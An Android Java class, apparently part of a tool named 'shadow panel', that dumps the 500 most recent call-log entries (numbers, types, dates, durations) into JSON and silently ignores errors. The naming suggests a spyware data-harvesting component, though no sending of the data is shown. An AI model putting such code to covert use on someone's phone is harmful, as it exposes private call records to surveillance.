package com.shadow.panel;
import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import org.json.JSONArray;
import org.json.JSONObject;
public class CallLogReader {
    public static JSONArray dump(Context ctx) {
        JSONArray arr = new JSONArray();
        try (Cursor c = ctx.getContentResolver().query(CallLog.Calls.CONTENT_URI, new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION}, null, null, CallLog.Calls.DATE + " DESC LIMIT 500")) {
            if (c == null) return arr;
            while (c.moveToNext()) {
                JSONObject o = new JSONObject();
                o.put("number", c.getString(0));
                o.put("type", c.getInt(1));
                o.put("date", c.getLong(2));
                o.put("duration", c.getLong(3));
                arr.put(o);
            }
        } catch (Exception ignored) {}
        return arr;
    }
}
